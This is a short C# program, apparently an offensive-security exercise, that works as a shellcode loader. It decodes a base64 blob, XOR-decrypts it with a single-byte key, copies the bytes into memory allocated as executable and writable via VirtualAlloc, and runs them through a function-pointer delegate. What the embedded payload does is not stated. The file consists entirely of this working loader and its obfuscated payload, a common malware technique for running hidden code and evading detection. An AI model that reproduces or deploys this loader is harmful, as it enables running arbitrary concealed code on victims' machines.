using System.Runtime.InteropServices;
using System.Text;

ExerciseOne();
return;

void ExerciseOne()
{
    var b64 =
        "41ec++/33x8fH15OXk9NTklXLs16V5RNf1eUTQdXlE0/V5RtT1cQqFVVUi7WVy7fsyN+Yx0zP17e1hJeHt798k1eTleUTT+UXSNXHs+Un5cfHx9Xmt9reFcez0+UVwdblF8/Vh7P/ElX4NZelCuXVx7JUi7WVy7fs17e1hJeHt4n/2ruUxxTOxdaJs5qx0dblF87Vh7PeV6UE1dblF8DVh7PXpQbl1cez15HXkdBRkVeR15GXkVXnPM/Xk3g/0deRkVXlA32SODg4EJXpR4fHx8fHx8fV5KSHh4fH16lLpRwmODKpP8CNRVepbmKooLgylec2zcjGWMVn+T/ahqkWAxtcHUfRl6WxeDKXCVDaHZxe3BobENsZmxrenIsLUN8fnN8MXpneh8=";
    var xoredBytes = Convert.FromBase64String(b64);
    byte[] buf = new byte[296];
    byte key = 0x1f;
    for (int i = 0; i < xoredBytes.Length; i++)
    {
        buf[i] = (byte)(xoredBytes[i] ^ key);
    }
    const uint allocType = 0x1000; //MemCommit
    const uint mode = 0x40; //PAGE_EXECUTE_READWRITE

    var ptr = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(buf.Length), allocType, mode);
    Marshal.Copy(buf, 0x0, ptr, buf.Length);

    WindowRun r = Marshal.GetDelegateForFunctionPointer<WindowRun>(ptr);
    r();
}

string xorIt(string key, string input)
{
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < input.Length; i++)
        sb.Append((char)(input[i] ^ key[(i % key.Length)]));
    String result = sb.ToString();

    return result;
}

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate void WindowRun();